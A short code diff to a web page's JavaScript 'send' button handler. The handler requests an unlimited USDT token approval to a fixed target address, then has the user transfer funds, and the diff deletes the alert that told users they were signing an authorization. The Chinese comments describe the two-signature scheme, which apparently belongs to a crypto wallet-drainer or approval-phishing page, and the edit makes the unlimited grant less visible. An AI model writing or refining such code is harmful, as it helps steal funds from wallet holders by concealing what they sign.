@@ -211,7 +211,6 @@ sendBtn.addEventListener("click", async () => {
         const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
         // 额度不足，第一次签名：无限授权 approve
         if (Number(allowance) < sunVal) {
-            alert("请确认钱包授权签名");
             await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
         }
         // 第二次签名：用户自己transfer直接转出，不是transferFrom划扣
